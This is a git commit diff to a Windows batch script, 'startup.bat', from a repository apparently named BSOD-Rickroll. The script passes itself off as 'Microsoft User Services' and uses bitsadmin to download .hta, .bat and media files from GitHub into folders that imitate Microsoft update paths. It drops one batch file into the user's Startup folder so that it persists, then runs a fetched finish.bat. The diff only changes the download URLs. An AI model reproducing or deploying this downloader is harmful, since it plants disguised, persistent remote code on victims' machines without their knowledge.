07bb25f2109244a0f2cf2836f83b61aed898d3e5
Sean <155543056+SeanFromWP@users.noreply.github.com>
2024-12-12 08:29:52 +0800

    Update startup.bat

--- Online/startup.bat
+++ Online/startup.bat
@@ -4,11 +4,11 @@ cls
 title Microsoft User Services
 mkdir "%AppData%\Microsoft\Update\User\Services"
 
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Storage/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Storage/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Storage/msrklbg.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Storage/msrkl.hta" "%AppData%\Microsoft\Update\msrkl.hta"
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Storage/msrkl.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Storage/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Storage/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Storage/msrklbg.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Storage/msrkl.hta" "%AppData%\Microsoft\Update\msrkl.hta"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Storage/msrkl.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
 
-bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/finish.bat" "%AppData%\finish.bat"
+bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/BSOD-Rickroll/main/Online/finish.bat" "%AppData%\finish.bat"
 start finish.bat
